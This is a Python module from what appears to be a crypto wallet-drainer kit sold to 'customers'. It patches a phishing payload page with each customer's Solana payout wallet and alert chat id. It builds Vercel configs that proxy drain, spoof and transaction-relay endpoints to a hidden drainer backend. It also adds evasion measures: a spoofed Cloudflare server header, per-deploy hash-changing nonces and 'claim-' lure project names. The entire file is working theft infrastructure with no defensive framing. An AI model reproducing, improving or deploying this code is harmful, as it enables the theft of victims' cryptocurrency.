# core/customer_sites.py — Customer payload pipeline
#
# Takes a customer's Solana payout wallet, patches a fresh copy of the Kiwi
# payload template, and produces the exact file set deployed to their stable
# Vercel project:
#
#   index.html   — the payload page (frame.html, renamed so / serves it)
#   vercel.json  — static serving + API rewrites to the drainer backend
#
# Same-origin design: the page calls API paths on its own domain and Vercel
# rewrites proxy them to the backend. The backend address never appears in
# client code, and the backend can rotate without touching payloads.

import json
import re
import secrets
import time
from pathlib import Path
from typing import Any, Optional

ROOT = Path(__file__).resolve().parent.parent
# Payload templates live in the Yale module — single source of truth
TEMPLATES_DIR = ROOT / "yale" / "server" / "public"
DEFAULT_DATA_DIR = ROOT / "data"

# Base58 Solana address: 32-44 chars, no 0/O/I/l
WALLET_RE = re.compile(r"^[1-9A-HJ-NP-Za-km-z]{32,44}$")

# Kiwi backend endpoints that must proxy to the drainer backend.
# Exact-path sources — anything else falls through to the catch-all page route.
KIWI_API_PATHS = [
    "/build-plain-drain",
    "/build-spoof",
    "/build-transaction",
    "/relay-transaction",
    "/relay-plain",
    "/notify-visit",
    "/notify-confirm",
    "/notify-reject",
    "/okxdmnendpt",
    "/api/getLatestHeaders",
]


def is_valid_wallet(wallet: str) -> bool:
    return bool(WALLET_RE.match(wallet or ""))


def patch_file(
    name: str,
    wallet: str,
    chat_id: str,
    aes_secret: str,
    usdc_payout: bool = False,
) -> str:
    """Patch a payload template file for one customer.

    - Payout wallet (quoted assignments only — `config.targetWallet` refs untouched)
    - Drain-alert chat id, injected next to the wallet
    - usdcPayout flag when the customer opted into USDC conversion
    - API_BASE set to same-origin ("") — Vercel rewrites proxy API paths
    - Shared AES secret replaces whatever the template carries
    """
    content = (TEMPLATES_DIR / name).read_text(encoding="utf-8")

    content = re.sub(r'targetWallet:\s*"[^"]*"', f'targetWallet: "{wallet}"', content)

    content = content.replace(
        f'targetWallet: "{wallet}",',
        f'targetWallet: "{wallet}", userChatId: "{chat_id}",',
    )

    if usdc_payout:
        content = content.replace(
            f'targetWallet: "{wallet}", userChatId: "{chat_id}",',
            f'targetWallet: "{wallet}", userChatId: "{chat_id}", usdcPayout: true,',
        )

    content = re.sub(r'const API_BASE = "[^"]*";', 'const API_BASE = "";', content)
    content = re.sub(r'const API_BASE_URL = "[^"]*";', 'const API_BASE_URL = "";', content)

    content = re.sub(r'const SECRET =\s*"[^"]*";', f'const SECRET = "{aes_secret}";', content)
    content = re.sub(r"app_[0-9a-f]{32,}", aes_secret, content)

    return content


def build_customer_files(
    wallet: str,
    chat_id: str,
    aes_secret: str,
    backend_origin: str,
    nonce: Optional[str] = None,
    usdc_payout: bool = False,
) -> dict[str, str]:
    """Full deployable file set for a customer's Vercel project.

    backend_origin: e.g. "https://chimera-drainer.fly.dev" (no trailing slash)
    nonce: per-deployment variation — injected as an HTML comment so every
    redeploy changes the file hash (fresh Vercel fingerprint) even though
    the visible page is identical.
    usdc_payout: patch the page so the backend swaps drained SOL to USDC.
    """
    page = patch_file("frame.html", wallet, chat_id, aes_secret, usdc_payout)
    if nonce:
        page = f"<!-- {nonce} -->\n" + page
    return {
        "index.html": page,
        "embed.js": (TEMPLATES_DIR / "embed.js").read_text(encoding="utf-8"),
        "vercel.json": build_vercel_json(backend_origin),
    }


def build_vercel_json(backend_origin: str) -> str:
    """vercel.json for a customer site.

    API paths proxy to the backend (listed first — rewrites are evaluated in
    order), everything else serves the payload page, mirroring the original
    kit's all-paths-to-frame.html routing.
    """
    backend_origin = backend_origin.rstrip("/")
    rewrites = [{"source": p, "destination": f"{backend_origin}{p}"} for p in KIWI_API_PATHS]
    # embed.js must serve as a static file, not fall through to the page
    rewrites.append({"source": "/embed.js", "destination": "/embed.js"})
    rewrites.append({"source": "/(.*)", "destination": "/index.html"})
    config = {
        "version": 2,
        "rewrites": rewrites,
        "headers": [
            {
                "source": "/(.*)",
                "headers": [
                    {"key": "X-Content-Type-Options", "value": "nosniff"},
                    {"key": "Server", "value": "cloudflare"},
                ],
            }
        ],
    }
    return json.dumps(config, indent=2)


class CustomerRegistry:
    """Persistent customer records (data/customers.json — gitignored)."""

    def __init__(self, path: Optional[Path] = None):
        self.path = Path(path) if path else DEFAULT_DATA_DIR / "customers.json"
        self.path.parent.mkdir(parents=True, exist_ok=True)

    def _load(self) -> dict[str, dict[str, Any]]:
        if not self.path.exists():
            return {}
        try:
            return json.loads(self.path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return {}

    def _save(self, data: dict[str, dict[str, Any]]) -> None:
        self.path.write_text(
            json.dumps(data, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )

    def add(self, wallet: str, chat_id: str, project_name: str) -> dict[str, Any]:
        if not is_valid_wallet(wallet):
            raise ValueError(f"invalid Solana wallet: {wallet}")
        if wallet in self._load():
            raise ValueError(f"customer already exists for {wallet}")
        record: dict[str, Any] = {
            "wallet": wallet,
            "chat_id": str(chat_id),
            "project_name": project_name,
            "usdc_payout": False,
            "created_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "deployments": [],
        }
        data = self._load()
        data[wallet] = record
        self._save(data)
        return record

    def delete(self, wallet: str) -> None:
        data = self._load()
        data.pop(wallet, None)
        self._save(data)

    def update_wallet(self, old_wallet: str, new_wallet: str) -> dict[str, Any]:
        """Change a customer's payout wallet, keeping the same project/URL.

        Re-records the entry under the new wallet key; deployment history is
        preserved (the caller redeploys the site right after)."""
        if not is_valid_wallet(new_wallet):
            raise ValueError(f"invalid Solana wallet: {new_wallet}")
        data = self._load()
        rec = data.get(old_wallet)
        if not rec:
            raise ValueError(f"unknown customer: {old_wallet}")
        if new_wallet in data and new_wallet != old_wallet:
            raise ValueError(f"customer already exists for {new_wallet}")
        del data[old_wallet]
        rec["wallet"] = new_wallet
        data[new_wallet] = rec
        self._save(data)
        return rec

    def set_usdc_payout(self, wallet: str, enabled: bool) -> None:
        data = self._load()
        if wallet not in data:
            raise ValueError(f"unknown customer: {wallet}")
        data[wallet]["usdc_payout"] = bool(enabled)
        self._save(data)

    def record_deployment(self, wallet: str, deployment_url: str, seed: str) -> None:
        data = self._load()
        if wallet not in data:
            return
        data[wallet].setdefault("deployments", []).append(
            {
                "url": deployment_url,
                "seed": seed[:16],
                "at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }
        )
        self._save(data)

    def get(self, wallet: str) -> Optional[dict[str, Any]]:
        return self._load().get(wallet)

    def all(self) -> list[dict[str, Any]]:
        return list(self._load().values())

    def new_project_name(self) -> str:
        return f"claim-{secrets.token_hex(4)}"
